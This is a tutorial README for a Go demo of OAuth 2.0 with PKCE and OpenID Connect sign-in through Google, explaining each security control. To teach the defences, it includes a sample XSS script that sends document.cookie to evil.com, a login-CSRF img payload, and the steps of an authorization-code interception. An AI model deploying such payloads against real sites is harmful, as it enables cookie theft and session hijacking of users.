# OAuth 2.0 & OpenID Connect — Production-Ready Go Demo

A fully annotated Go implementation of the OAuth 2.0 Authorization Code Flow with OpenID Connect (OIDC), built for learning. Every security decision is explained: what the threat is, how an attacker would exploit the gap, what the code does about it, and what actually travels over HTTP between the browser, your server, and Google.

---

## Table of Contents

1. [What This Is (and Is Not)](#1-what-this-is-and-is-not)
2. [OAuth 2.0 vs OpenID Connect — The Concepts](#2-oauth-20-vs-openid-connect--the-concepts)
3. [Libraries Used and Why](#3-libraries-used-and-why)
4. [Project Structure](#4-project-structure)
5. [How to Run](#5-how-to-run)
6. [The Full Login Flow — End to End](#6-the-full-login-flow--end-to-end)
7. [Security Deep Dives](#7-security-deep-dives)
   - [7.1 PKCE — Proof Key for Code Exchange](#71-pkce--proof-key-for-code-exchange)
   - [7.2 State Parameter — CSRF Protection](#72-state-parameter--csrf-protection)
   - [7.3 Server-Side Sessions — No Tokens in the Browser](#73-server-side-sessions--no-tokens-in-the-browser)
   - [7.4 ID Token Cryptographic Verification](#74-id-token-cryptographic-verification)
   - [7.5 HttpOnly + SameSite Cookies](#75-httponly--samesite-cookies)
   - [7.6 Automatic Token Refresh via TokenSource](#76-automatic-token-refresh-via-tokensource)
   - [7.7 Auth Middleware — The Gatekeeper Pattern](#77-auth-middleware--the-gatekeeper-pattern)
8. [Calling a Google API — The Drive Example](#8-calling-a-google-api--the-drive-example)
9. [What Stays in the Browser vs What Stays on the Server](#9-what-stays-in-the-browser-vs-what-stays-on-the-server)
10. [Production Checklist](#10-production-checklist)

---

## 1. What This Is (and Is Not)

### What it is
A learning-focused implementation of the most secure OAuth 2.0 pattern available for web apps today — the **Authorization Code Flow with PKCE**. It demonstrates:

- How to delegate authentication to Google without ever handling a password
- How cryptographic token verification works
- How to keep sensitive tokens off the browser completely
- How to automatically renew tokens without disrupting the user

### What it is not
- A production app (uses in-memory sessions, no HTTPS enforcement, no rate limiting)
- A replacement for reading the actual [OAuth 2.0 RFC 6749](https://datatracker.ietf.org/doc/html/rfc6749) and [OIDC Core spec](https://openid.net/specs/openid-connect-core-1_0.html)

### The two roles your server plays
OAuth 2.0 involves three parties. Your Go server acts as two of them simultaneously:

```
┌─────────────────────────────────────────────────────────────────────────┐
│  Resource Owner  →  the human user sitting at the browser               │
│  Client          →  your Go server (acting on behalf of the user)       │
│  Authorization   →  Google (issues tokens, verifies identity)           │
│  Server             also called the Identity Provider (IdP)             │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 2. OAuth 2.0 vs OpenID Connect — The Concepts

These two are often confused. They solve different problems and are used together.

### OAuth 2.0 — "Can I access your stuff?"
OAuth 2.0 is an **authorization** protocol. It answers: "Can this app access these resources on behalf of this user?"

The result is an **Access Token** — a credential that lets your server call Google APIs (Drive, Calendar, etc.) on the user's behalf. It does **not** tell you who the user is.

```
Without OIDC, an access token just means:
  "Someone authorized this app to read their Drive files."
  It does NOT mean: "The user is bob@gmail.com."
```

### OpenID Connect (OIDC) — "Who is this person?"
OIDC is an **authentication** layer built on top of OAuth 2.0. It answers: "Who is the user?"

It adds one thing to the OAuth 2.0 response: an **ID Token** — a signed JWT (JSON Web Token) that contains the user's identity claims.

```json
{
  "iss": "https://accounts.google.com",
  "sub": "1234567890",
  "email": "bob@gmail.com",
  "name": "Bob Smith",
  "aud": "your-client-id.apps.googleusercontent.com",
  "exp": 1711929600,
  "iat": 1711926000
}
```

The `sub` (subject) claim is the **stable, unique user identifier** — it never changes even if the user changes their email address. Always use `sub` to identify users in your database, not `email`.

### The Three Tokens
| Token | What it is | Who it's for | Lifetime |
|---|---|---|---|
| **Authorization Code** | A one-time-use code returned in the URL | Exchanged by your server for real tokens | 60 seconds |
| **Access Token** | A credential to call Google APIs | Your server uses it in API requests | ~1 hour |
| **ID Token** | A signed JWT proving the user's identity | Your server reads the claims | ~1 hour |
| **Refresh Token** | A long-lived token to get new access tokens | Stored on your server, used to renew | Until revoked |

---

## 3. Libraries Used and Why

### `golang.org/x/oauth2`
**Purpose:** Handles the entire OAuth 2.0 Authorization Code Flow.

Without this library you would need to:
- Manually construct the authorization URL with all required query parameters
- Make the back-channel POST request to exchange the authorization code for tokens
- Parse and validate the token response JSON
- Implement token refresh logic
- Inject Bearer tokens into every outbound API request

**Key types used in this project:**

`oauth2.Config` — holds your client credentials and scopes. The central object.
```go
oauth2Config: &oauth2.Config{
    ClientID:     "...",
    ClientSecret: "...",
    RedirectURL:  "http://localhost:8080/auth/google/callback",
    Endpoint:     provider.Endpoint(),   // auth URL + token URL from OIDC discovery
    Scopes:       []string{"openid", "profile", "email"},
}
```

`oauth2.Config.AuthCodeURL(state, opts...)` — builds the redirect URL to Google's authorization endpoint. This is what the browser visits.

`oauth2.Config.Exchange(ctx, code, opts...)` — makes a server-to-server POST to Google's token endpoint to swap the authorization code for tokens. The user never sees this request.

`oauth2.Config.TokenSource(ctx, token)` — wraps a token in a `TokenSource` that auto-refreshes when expired. Calling `.Token()` always returns a valid, non-expired access token.

`oauth2.NewClient(ctx, tokenSource)` — returns an `*http.Client` that automatically attaches a valid Bearer token to every outgoing request. The token refresh happens invisibly.

`oauth2.GenerateVerifier()` — generates a cryptographically random PKCE code verifier.

`oauth2.S256ChallengeOption(verifier)` — computes `base64url(SHA-256(verifier))` and adds it to the auth URL as `code_challenge`.

`oauth2.VerifierOption(verifier)` — sends the raw verifier during token exchange so Google can verify the challenge.

`oauth2.AccessTypeOffline` — tells Google to include a refresh token in the response. Without this, you only get a one-hour access token and the user must re-login every hour.

---

### `github.com/coreos/go-oidc/v3`
**Purpose:** Cryptographically verifies ID Tokens and handles OIDC Discovery.

Without this library you would need to:
- Fetch `https://accounts.google.com/.well-known/openid-configuration` manually
- Parse the JSON to find the JWKS endpoint
- Fetch and cache Google's public keys
- Implement JWT header/payload/signature splitting and base64url decoding
- Implement RSA-SHA256 signature verification
- Validate all required claims (iss, aud, exp, iat, nonce)
- Handle key rotation (Google rotates its public keys periodically)

**Key types used in this project:**

`oidc.NewProvider(ctx, issuerURL)` — performs OIDC Discovery. It fetches `/.well-known/openid-configuration` and extracts all endpoints. This is the recommended approach over hard-coding Google's URLs.

```go
// What oidc.NewProvider fetches (simplified):
// GET https://accounts.google.com/.well-known/openid-configuration
// Response:
{
  "issuer": "https://accounts.google.com",
  "authorization_endpoint": "https://accounts.google.com/o/oauth2/v2/auth",
  "token_endpoint": "https://oauth2.googleapis.com/token",
  "jwks_uri": "https://www.googleapis.com/oauth2/v3/certs",
  ...
}
```

`provider.Endpoint()` — returns the auth and token URLs from the discovery document, ready for `oauth2.Config`.

`provider.Verifier(&oidc.Config{ClientID: "..."})` — creates an `IDTokenVerifier` locked to your client ID. This prevents token reuse attacks where a token issued for another app is sent to yours.

`verifier.Verify(ctx, rawIDToken)` — the core security function. Fetches Google's current public keys, verifies the JWT signature, and validates all claims. Returns an error if anything is wrong.

`idToken.Claims(&struct{})` — decodes the verified payload into your struct. You only call this *after* verification succeeds.

---

### Standard Library (`crypto/rand`, `sync`, `net/http`, `encoding/json`)

`crypto/rand.Read()` — generates cryptographically secure random bytes. Used for state tokens and session IDs. **Never use `math/rand` for security-sensitive values** — it is not cryptographically secure and its output can be predicted.

`sync.RWMutex` — protects the in-memory session map from concurrent access. Multiple HTTP requests can run simultaneously in Go's HTTP server, so the map needs a lock.

`net/http.Cookie` with `HttpOnly`, `SameSite`, `MaxAge` — the browser-level controls on how cookies behave. Explained in detail in [section 7.5](#75-httponly--samesite-cookies).

---

## 4. Project Structure

```
main.go
│
├── googleCredentials       Struct that mirrors the JSON from Google Cloud Console
├── loadCredentials()       Reads client_id and client_secret from the JSON file
│
├── Session                 Server-side session record (tokens live here, not in browser)
├── SessionStore            Thread-safe in-memory map of sessionID → Session
│
├── app                     Central struct: holds oauth2Config, verifier, session store
│
├── requireAuth()           Middleware — wraps handlers to enforce login
│
├── handleHome()            Public page — shows login link or email
├── handleLogin()           Generates PKCE verifier + state, redirects to Google
├── handleCallback()        Verifies state+PKCE, exchanges code, verifies ID token,
│                           creates session
├── handleProfile()         Protected — shows user's name, email, picture
├── handleDrive()           Protected — calls Google Drive API using stored token
└── handleLogout()          Deletes server-side session, clears cookie
```

---

## 5. How to Run

**Prerequisites:** Go 1.23+, a Google Cloud project with OAuth 2.0 credentials.

1. Create credentials at [console.cloud.google.com](https://console.cloud.google.com):
   - Application type: **Web application**
   - Authorized redirect URI: `http://localhost:8080/auth/google/callback`
   - Download the JSON file and place it in the project root

2. Update the filename in `main.go`:
```go
creds := loadCredentials("your-client-secret-file.json")
```

3. Run:
```bash
go run main.go
```

4. Open `http://localhost:8080`

---

## 6. The Full Login Flow — End to End

This is what happens when a user clicks "Sign in with Google." Every arrow is a real HTTP request.

```
Browser                         Your Go Server                    Google
   |                                  |                               |
   |                                  |                               |
   | GET /login                       |                               |
   |─────────────────────────────────►|                               |
   |                                  |                               |
   |                                  | 1. Generate PKCE verifier     |
   |                                  |    (random 32 bytes)          |
   |                                  |                               |
   |                                  | 2. Compute code_challenge     |
   |                                  |    = base64url(SHA256(v))     |
   |                                  |                               |
   |                                  | 3. Generate state token       |
   |                                  |    (random 32 bytes)          |
   |                                  |                               |
   |                                  | 4. Store both in cookies      |
   |                                  |    (HttpOnly, 5 min TTL)      |
   |                                  |                               |
   | 302 → accounts.google.com/auth   |                               |
   |   ?client_id=...                 |                               |
   |   &redirect_uri=.../callback     |                               |
   |   &scope=openid+profile+email    |                               |
   |   &response_type=code            |                               |
   |   &state=Xk9mP2...               |                               |
   |   &code_challenge=SHA256HASH     |                               |
   |   &code_challenge_method=S256    |                               |
   |◄─────────────────────────────────|                               |
   |                                  |                               |
   | GET accounts.google.com/auth?... |                               |
   |──────────────────────────────────────────────────────────────►|
   |                                  |                               |
   |         (Google shows login + consent screen)                    |
   |                                  |                               |
   | User approves                    |                               |
   |                                  |                               |
   | 302 → /auth/google/callback      |                               |
   |   ?code=4/0AX4XfWi...            |                               |
   |   &state=Xk9mP2...               |                               |
   |◄──────────────────────────────────────────────────────────────|
   |                                  |                               |
   | GET /auth/google/callback        |                               |
   |   ?code=4/0AX4XfWi...            |                               |
   |   &state=Xk9mP2...               |                               |
   |─────────────────────────────────►|                               |
   |                                  |                               |
   |                                  | 5. Verify state cookie        |
   |                                  |    cookie == query param ✓    |
   |                                  |                               |
   |                                  | 6. Retrieve verifier cookie   |
   |                                  |                               |
   |                                  | POST /token (back-channel)    |
   |                                  |   grant_type=authorization_code
   |                                  |   code=4/0AX4XfWi...         |
   |                                  |   code_verifier=RAW_SECRET   |
   |                                  |   client_id=...              |
   |                                  |   client_secret=...          |
   |                                  |──────────────────────────────►|
   |                                  |                               |
   |                                  |         access_token          |
   |                                  |         refresh_token         |
   |                                  |         id_token (JWT)        |
   |                                  |◄──────────────────────────────|
   |                                  |                               |
   |                                  | 7. Verify ID Token JWT        |
   |                                  |    - fetch Google's JWKS      |
   |                                  |    - verify RSA signature     |
   |                                  |    - check iss, aud, exp ✓    |
   |                                  |                               |
   |                                  | 8. Extract claims             |
   |                                  |    (sub, email, name, pic)    |
   |                                  |                               |
   |                                  | 9. Create server-side session |
   |                                  |    Store tokens in memory     |
   |                                  |                               |
   | 302 → /profile                   |                               |
   | Set-Cookie: session_id=OPAQUE_ID |                               |
   |◄─────────────────────────────────|                               |
   |                                  |                               |
   | GET /profile                     |                               |
   | Cookie: session_id=OPAQUE_ID     |                               |
   |─────────────────────────────────►|                               |
   |                                  | 10. Look up session by ID     |
   |                                  |     Return profile HTML       |
   |◄─────────────────────────────────|                               |
```

After step 9, **the browser never sees a token again**. It only knows `session_id=OPAQUE_ID`.

---

## 7. Security Deep Dives

---

### 7.1 PKCE — Proof Key for Code Exchange

**RFC:** [RFC 7636](https://datatracker.ietf.org/doc/html/rfc7636)

#### The Threat — Authorization Code Interception

The authorization code `?code=4/0AX4XfWi...` travels in the URL when Google redirects the user back to your callback. URLs are dangerous:
- They appear in browser history
- They appear in server access logs
- They can leak via the `Referer` header if your page loads external resources
- On Android/iOS, multiple apps can register the same URL scheme and intercept the redirect

An attacker who captures the code has ~60 seconds to exchange it for tokens before it expires.

#### Without PKCE — The Attack
```
1. Attacker observes: GET /callback?code=STOLEN_CODE&state=...
2. Attacker sends:    POST /token
                        code=STOLEN_CODE
                        client_id=your-client-id
                        client_secret=...  (attacker may not have this for public clients)
3. Google returns:   access_token + id_token
4. Attacker is now logged in as the victim
```

#### With PKCE — Why the Attack Fails

**Your server generates a secret before the flow starts:**
```go
// handleLogin — before redirecting to Google:
verifier := oauth2.GenerateVerifier()
// verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"  (example)
// This is a random 32-byte value, base64url-encoded. Never sent over the network.

// Stored in a short-lived HttpOnly cookie — browser can't read it with JS
http.SetCookie(w, &http.Cookie{
    Name:     "pkce_verifier",
    Value:    verifier,
    MaxAge:   300,       // expires in 5 minutes
    HttpOnly: true,
})
```

**Only the hash (challenge) is sent to Google:**
```go
// oauth2.S256ChallengeOption computes: base64url(SHA-256(verifier))
authURL := a.oauth2Config.AuthCodeURL(state,
    oauth2.S256ChallengeOption(verifier),
)
// URL includes: &code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cg
//               &code_challenge_method=S256
```

Google stores the hash alongside the authorization code.

**During token exchange, you prove you know the secret:**
```go
// handleCallback — sending the raw verifier (not the hash):
token, err := a.oauth2Config.Exchange(ctx, code,
    oauth2.VerifierOption(verifier),
)
// Token request includes: &code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
```

Google recomputes `SHA-256(verifier)` and checks it matches the challenge it stored. If it doesn't match, the exchange is rejected.

**The attacker has the code but not the verifier:**
```
Attacker tries: POST /token
                  code=STOLEN_CODE
                  code_verifier=???  ← they never saw this; it was in an HttpOnly cookie
Google responds: 400 Bad Request — code_verifier mismatch
```

#### What Travels Over the Network

| Leg | What's Included | What's NOT Included |
|---|---|---|
| Browser → Google (auth URL) | `code_challenge` (SHA-256 hash) | The verifier itself |
| Google → Browser (redirect) | `code` (short-lived, one-use) | The challenge or verifier |
| Your server → Google (token exchange) | `code` + `code_verifier` (raw secret) | Nothing sensitive in URL — this is a POST body |

The verifier is only ever in two places: your server's memory and the HttpOnly cookie. It never appears in a URL.

---

### 7.2 State Parameter — CSRF Protection

**RFC:** [RFC 6749 Section 10.12](https://datatracker.ietf.org/doc/html/rfc6749#section-10.12)

#### The Threat — CSRF (Cross-Site Request Forgery)

CSRF exploits the fact that browsers automatically attach cookies to requests. Without state verification, an attacker can trick your server into processing their authorization code as if it were yours.

#### The Attack — Login CSRF

The goal of Login CSRF is not to steal *your* session — it's to make you unknowingly log in to *the attacker's* account on your server.

```
1. Attacker starts an OAuth flow with Google using THEIR own Google account
2. Attacker receives the redirect back:
   /callback?code=ATTACKER_CODE&state=anything
3. Attacker does NOT visit this URL. Instead, they send it to you:
   <img src="https://yourapp.com/callback?code=ATTACKER_CODE&state=anything">
4. Your browser follows the src (browsers follow img srcs automatically)
5. Without state verification: your server exchanges ATTACKER_CODE
6. Result: you are now logged in to the attacker's account on yourapp.com
7. Attacker waits for you to submit sensitive data (payment info, etc.)
```

#### How the Code Prevents It

The state parameter creates a shared secret that only your browser and your server know at the moment login starts. Google acts as a trusted relay — it returns whatever state you gave it, unchanged.

```go
// handleLogin — a fresh random string is generated each time:
state, _ := randomToken()
// state = "gE7IuVxPp3z8rQmKjfNbYhDs6oCwLa2t..."  (44 random chars)

// Stored in cookie — bound to THIS browser:
http.SetCookie(w, &http.Cookie{
    Name:     "oauth_state",
    Value:    state,
    MaxAge:   300,
    HttpOnly: true,
    SameSite: http.SameSiteLaxMode,  // not sent on cross-site requests
})

// Sent to Google as part of the authorization URL:
authURL := a.oauth2Config.AuthCodeURL(state, ...)
// URL: ?state=gE7IuVxPp3z8rQmKjfNbYhDs6oCwLa2t...
```

```go
// handleCallback — verify it came back intact:
stateCookie, err := r.Cookie("oauth_state")  // what this browser stored
queryState := r.URL.Query().Get("state")       // what Google returned

if queryState != stateCookie.Value {
    // The state doesn't match. Either:
    // (a) This is a CSRF attack — code was crafted by someone else
    // (b) The cookie expired before the user finished logging in
    http.Error(w, "state mismatch — possible CSRF", http.StatusBadRequest)
    return
}

// Immediately delete the state cookie — it's single-use
http.SetCookie(w, &http.Cookie{Name: "oauth_state", MaxAge: -1, Path: "/"})
```

#### Why the Attack Fails

The attacker sends you a URL with `state=anything`. Your browser has a `oauth_state` cookie from a *different* login attempt (or no cookie at all). The values don't match → request rejected.

Even if the attacker knows your state value from your cookie (they can't — it's HttpOnly), they can't generate a callback URL with that state because Google will only return the state that was sent *in the authorization request that produced the code*. The attacker started their own authorization request with their own state.

---

### 7.3 Server-Side Sessions — No Tokens in the Browser

#### The Threat — Token Exposure

Tokens are high-value credentials. If an attacker gets your access token, they can call Google APIs as you. If they get your refresh token, they have long-term access until you revoke it.

**Naive approach (what many tutorials show):**
```go
// INSECURE — storing actual tokens in cookies:
http.SetCookie(w, &http.Cookie{Name: "access_token",  Value: token.AccessToken})
http.SetCookie(w, &http.Cookie{Name: "refresh_token", Value: token.RefreshToken})
http.SetCookie(w, &http.Cookie{Name: "user_email",    Value: claims.Email})
```

Problems:
- Anyone who opens browser DevTools → Application → Cookies can read these values
- If XSS is possible, a script can read non-HttpOnly cookies directly
- The access token is sent to your server on every request even when you don't need it
- Cookies have a 4KB size limit — tokens can exceed this

#### What This Code Does Instead

The server keeps a map of `sessionID → Session`. The session contains everything. The browser gets only an opaque random ID that is meaningless without the server's map.

```go
// Session lives entirely on the server:
type Session struct {
    UserSub     string
    Email       string
    Name        string
    Picture     string
    CreatedAt   time.Time
    TokenSource oauth2.TokenSource  // access token + refresh token inside here
}

// In-memory store — protected by a read-write mutex for concurrent access:
type SessionStore struct {
    mu   sync.RWMutex
    data map[string]*Session
}
```

```go
// handleCallback — after verifying the user's identity:

// Store everything server-side:
a.sessions.Set(sessionID, &Session{
    UserSub:     claims.Sub,
    Email:       claims.Email,
    TokenSource: a.oauth2Config.TokenSource(context.Background(), token),
    CreatedAt:   time.Now(),
})

// Send only the opaque ID to the browser:
a.setSessionCookie(w, sessionID)
// Sets: session_id=Xk9mP2abc...  (44 random chars, no user data)
```

#### What the Browser Has vs What the Server Has

```
Browser's cookie jar:
  session_id=Xk9mP2abc4QrZnWyLdJfTsUvEhGpOiMk

  That's it. 44 random characters. Nothing else.

Server's memory:
  "Xk9mP2abc4QrZnWyLdJfTsUvEhGpOiMk" → {
      UserSub:     "109876543210987654321"
      Email:       "bob@gmail.com"
      Name:        "Bob Smith"
      Picture:     "https://lh3.googleusercontent.com/..."
      CreatedAt:   2024-03-28 10:30:00
      TokenSource: <contains access token ya29.a0... and refresh token 1//0d...>
  }
```

If an attacker steals the session ID cookie:
- They can impersonate the user to *your server* (session hijacking — mitigated by HttpOnly + HTTPS)
- They **cannot** call Google APIs directly — they don't have the access token
- They **cannot** extract the user's email or personal data from the cookie itself
- Logout invalidates the server-side session, making the stolen cookie worthless immediately

#### The `sync.RWMutex` — Why It's Needed

Go's HTTP server handles every request in a separate goroutine. Multiple requests can run simultaneously. Without locking, two goroutines could modify the map at the same time, causing a data race (undefined behavior, potential crash).

```go
// Reading (multiple goroutines can read simultaneously):
func (s *SessionStore) Get(id string) (*Session, bool) {
    s.mu.RLock()           // multiple readers allowed
    defer s.mu.RUnlock()
    return s.data[id]
}

// Writing (exclusive access — no readers allowed while writing):
func (s *SessionStore) Set(id string, sess *Session) {
    s.mu.Lock()            // exclusive write lock
    defer s.mu.Unlock()
    s.data[id] = sess
}
```

---

### 7.4 ID Token Cryptographic Verification

#### The Threat — Fake Identity Claims

The ID Token arrives as a JWT: three base64url-encoded segments joined by dots.

```
eyJhbGciOiJSUzI1NiIsImtpZCI6IjFlOWdkazcifQ   ← header (algorithm + key ID)
.
eyJzdWIiOiIyNDA5ODAwMzI4NDYxNzIwNjQ5IiwiZW1h  ← payload (the claims)
.
SJRp5bFcgeRly2GGbIFvZSLdADhfvpB1hQ...         ← signature
```

Without verification, an attacker could:
1. Decode the payload (it's just base64 — not encrypted)
2. Modify the `email` claim to `admin@yourcompany.com`
3. Re-encode it and submit the modified token

Your server would see `email: admin@yourcompany.com` and think it's authentic.

#### What `verifier.Verify()` Does

```go
idToken, err := a.verifier.Verify(ctx, rawIDToken)
```

This single call performs five security checks:

**Check 1: Fetch Google's current public keys**
```
GET https://www.googleapis.com/oauth2/v3/certs

Response (simplified):
{
  "keys": [{
    "kty": "RSA",
    "kid": "1e9gdk7",      ← matches the "kid" in the JWT header
    "n": "sJ1LQ3...",      ← RSA modulus (public key)
    "e": "AQAB"            ← RSA exponent
  }]
}
```

go-oidc caches these keys and re-fetches when a token arrives with an unknown `kid`.

**Check 2: Verify the RSA-SHA256 signature**
```
The library computes:
  SHA-256(base64url(header) + "." + base64url(payload))

Then verifies using Google's RSA public key that:
  RSA_verify(signature, hash, public_key) == true

This is only possible if Google (and only Google) signed it with their private key.
Modifying even one character of the payload changes the hash → signature is invalid.
```

**Check 3: Verify the issuer**
```go
// Rejects tokens from any server pretending to be Google:
if idToken.Issuer != "https://accounts.google.com" {
    return error
}
```

**Check 4: Verify the audience**
```go
// Rejects tokens issued for other apps (prevents token reuse attacks):
if !contains(idToken.Audience, config.ClientID) {
    return error
}
// Imagine app B has bad security and leaks tokens.
// An attacker takes app B's token and sends it to your app.
// Without aud check: your app accepts it.
// With aud check: token's aud == app B's ClientID ≠ your ClientID → rejected.
```

**Check 5: Verify expiry**
```go
// Rejects expired tokens (replay attack mitigation):
if time.Now().After(idToken.Expiry) {
    return error
}
```

Only after all five checks pass does `idToken.Claims()` become safe to call.

---

### 7.5 HttpOnly + SameSite Cookies

#### HttpOnly — Invisible to JavaScript

```go
HttpOnly: true,
```

The browser enforces this at the engine level. JavaScript's `document.cookie` API will not include HttpOnly cookies in its return value. The `fetch()` and `XMLHttpRequest` APIs cannot read them either.

**XSS Attack Scenario:**
```html
<!-- Attacker injects this script into your page via a comment field or similar -->
<script>
  // Without HttpOnly:
  fetch("https://evil.com/steal?cookies=" + document.cookie)
  // This would send ALL cookies to the attacker

  // With HttpOnly:
  document.cookie  →  ""  (empty — session_id is not visible)
  // The script runs but gets nothing useful
</script>
```

The browser still sends HttpOnly cookies automatically on every request to your server — the restriction is only on JavaScript *reading* them.

#### SameSite=Lax — Cross-Site Request Blocking

```go
SameSite: http.SameSiteLaxMode,
```

This controls when the browser includes the cookie in cross-site requests.

| Request Type | Example | Cookie Sent? |
|---|---|---|
| Direct navigation | User types URL in address bar | Yes |
| Top-level link click | User clicks `<a href="yourapp.com/x">` | Yes |
| Form GET | `<form method="GET" action="yourapp.com/x">` | Yes |
| Cross-site POST | `<form method="POST" action="yourapp.com/x">` | **No** |
| Cross-site fetch/XHR | `fetch("yourapp.com/x")` from evil.com | **No** |
| Cross-site img/iframe | `<img src="yourapp.com/x">` | **No** |

The CSRF attack described in section 7.2 used an `<img>` tag — with `SameSite=Lax`, the `session_id` cookie would not be sent with that request, so the state verification would fail even if the attacker somehow knew your state value.

`SameSite=Strict` would be even more restrictive (no cross-site requests at all, including link clicks), but it breaks things like links from emails or external sites. `Lax` is the right balance for most applications.

#### MaxAge — Session Expiry

```go
MaxAge: 24 * 60 * 60,  // 24 hours in seconds
```

After 24 hours, the browser automatically deletes the cookie. This limits the window of exposure if a session ID is compromised. For sensitive applications, use shorter lifetimes (30–60 minutes) and implement session renewal.

---

### 7.6 Automatic Token Refresh via TokenSource

#### The Threat — Broken Access After 1 Hour

Google's access tokens expire after approximately one hour. A naive implementation stores the token string and sends it directly — after an hour, every API call returns `401 Unauthorized`.

#### How `TokenSource` Works

When the token was obtained during login, it came with an expiry time:
```json
{
  "access_token": "ya29.a0AVvZVs...",
  "expires_in": 3599,
  "refresh_token": "1//0dNzVLn...",
  "token_type": "Bearer"
}
```

The `TokenSource` wraps this token and tracks the expiry:

```go
// In handleCallback — create the TokenSource once per session:
tokenSource := a.oauth2Config.TokenSource(context.Background(), token)
// context.Background() is important: we use it (not the request context)
// so the refresh works even after the callback request has ended.
```

When a protected handler needs to make an API call:

```go
// In handleDrive — just create a client:
client := oauth2.NewClient(r.Context(), sess.TokenSource)
resp, _ := client.Get("https://www.googleapis.com/drive/v3/files?...")
```

What happens internally when `client.Get()` is called:

```
1. The Transport calls sess.TokenSource.Token()

2a. If token is still valid (expiry > now + buffer):
      Return cached token immediately.
      Attach: Authorization: Bearer ya29.a0AVvZVs...

2b. If token is expired:
      Make a back-channel POST (server-to-server, user doesn't see it):

      POST https://oauth2.googleapis.com/token
      Content-Type: application/x-www-form-urlencoded

      grant_type=refresh_token
      &refresh_token=1//0dNzVLn...
      &client_id=827076828039-...apps.googleusercontent.com
      &client_secret=GOCSPX-...

      Google responds:
      {
        "access_token": "ya29.a0AVvZVs_NEW_TOKEN...",
        "expires_in": 3599,
        "token_type": "Bearer"
      }

      TokenSource stores the new token and returns it.

3. The original GET /drive/v3/files proceeds with the fresh token.
   The handler (handleDrive) never knew any of this happened.
```

This is why we use `context.Background()` to create the TokenSource, not `r.Context()`. The request context is cancelled when the HTTP request finishes. If the access token expires and needs refresh during a future request, the refresh uses the stored context — which needs to still be valid.

---

### 7.7 Auth Middleware — The Gatekeeper Pattern

#### The Problem with Per-Handler Auth Checks

Imagine you have 10 protected routes. You could add a session check to each one:

```go
// Fragile approach — easy to forget on one route:
func (a *app) handleProfile(w http.ResponseWriter, r *http.Request) {
    sess, _, ok := a.getSession(r)
    if !ok {
        http.Redirect(w, r, "/", http.StatusFound)
        return
    }
    // ... rest of handler
}

func (a *app) handleSettings(w http.ResponseWriter, r *http.Request) {
    // Developer forgets to add the check here
    // Endpoint is now publicly accessible
}
```

#### The Middleware Solution

A middleware is a function that takes a handler and returns a new handler. It runs *before* the inner handler and can short-circuit the request.

```go
func (a *app) requireAuth(next http.HandlerFunc) http.HandlerFunc {
    return func(w http.ResponseWriter, r *http.Request) {
        _, _, ok := a.getSession(r)
        if !ok {
            http.Redirect(w, r, "/", http.StatusFound)
            return  // next is NEVER called — handleProfile never runs
        }
        next(w, r)  // session exists — proceed to the real handler
    }
}
```

Applied at registration time, not at handler definition time:

```go
mux.HandleFunc("/profile",  a.requireAuth(a.handleProfile))
mux.HandleFunc("/drive",    a.requireAuth(a.handleDrive))
// If you add a new route and forget requireAuth, it's immediately visible here.
// handleProfile itself contains no auth logic — it just does its job.
```

The handlers become simpler:

```go
func (a *app) handleProfile(w http.ResponseWriter, r *http.Request) {
    sess, _, _ := a.getSession(r)  // guaranteed to succeed — middleware ensured it
    // use sess directly, no nil check needed
}
```

---

## 8. Calling a Google API — The Drive Example

Once a user is authenticated, the access token can be used to call any Google API the user authorized. This demonstrates the "authorization" half of OAuth 2.0 — not just proving identity but actually doing something on behalf of the user.

**Step 1: Add the Drive scope**

In `main.go`, uncomment:
```go
Scopes: []string{
    oidc.ScopeOpenID,
    "profile",
    "email",
    "https://www.googleapis.com/auth/drive.readonly",  // ← uncomment this
},
```

**Step 2: The user will see a new consent screen**

Adding a new scope requires the user to re-authorize. Google shows them: "This app wants to view your Google Drive files." If they approve, the access token (and subsequent refreshed tokens) will include Drive access.

**Step 3: Call the API**

```go
func (a *app) handleDrive(w http.ResponseWriter, r *http.Request) {
    sess, _, _ := a.getSession(r)

    // oauth2.NewClient wraps the HTTP client with automatic token injection.
    // Every request gets: Authorization: Bearer <valid_access_token>
    // If the token is expired, it's silently refreshed before the request goes out.
    client := oauth2.NewClient(r.Context(), sess.TokenSource)

    resp, err := client.Get(
        "https://www.googleapis.com/drive/v3/files" +
        "?pageSize=10&fields=files(name,mimeType,webViewLink)",
    )
    // ...
}
```

**What the HTTP request looks like:**

```
GET /drive/v3/files?pageSize=10&fields=... HTTP/1.1
Host: www.googleapis.com
Authorization: Bearer ya29.a0AVvZVsR8k...
```

Google checks that the Bearer token is valid and has the `drive.readonly` scope, then returns the file list. The token is proof that a specific user authorized this app to read their Drive.

---

## 9. What Stays in the Browser vs What Stays on the Server

```
┌─────────────────────────────────────────────────────────────────────┐
│  BROWSER                                                            │
│                                                                     │
│  Cookies:                                                           │
│    session_id=Xk9mP2abc...    ← opaque random ID, 44 chars         │
│                                                                     │
│  During login only (5 min TTL, then deleted):                       │
│    oauth_state=gE7IuVxPp...   ← CSRF check value                   │
│    pkce_verifier=dBjftJeZ...  ← PKCE secret                        │
│                                                                     │
│  What the browser NEVER has:                                        │
│    ✗ Access token                                                   │
│    ✗ Refresh token                                                  │
│    ✗ ID token                                                       │
│    ✗ User's email, name, or picture (except what's in the HTML)    │
│    ✗ Client secret                                                  │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│  SERVER (Go process memory)                                         │
│                                                                     │
│  sessions["Xk9mP2abc..."] = {                                       │
│    UserSub:     "109876543210987654321"   ← stable Google user ID   │
│    Email:       "bob@gmail.com"                                     │
│    Name:        "Bob Smith"                                         │
│    Picture:     "https://lh3.googleusercontent.com/..."             │
│    CreatedAt:   2024-03-28 10:30:00                                 │
│    TokenSource: {                                                   │
│      accessToken:  "ya29.a0AVvZVs..."    ← used to call APIs       │
│      refreshToken: "1//0dNzVLn..."       ← used to get new tokens  │
│      expiry:       2024-03-28 11:30:00                              │
│    }                                                                │
│  }                                                                  │
└─────────────────────────────────────────────────────────────────────┘
```

---

## 10. Production Checklist

The following are not implemented in this demo but are required before deploying:

| Item | Why |
|---|---|
| **HTTPS everywhere** | Cookies with `Secure: true` only transmit over TLS. Without HTTPS, session IDs can be sniffed on the network. |
| **Persistent session store** | The in-memory map is lost on server restart. Use Redis or a database. |
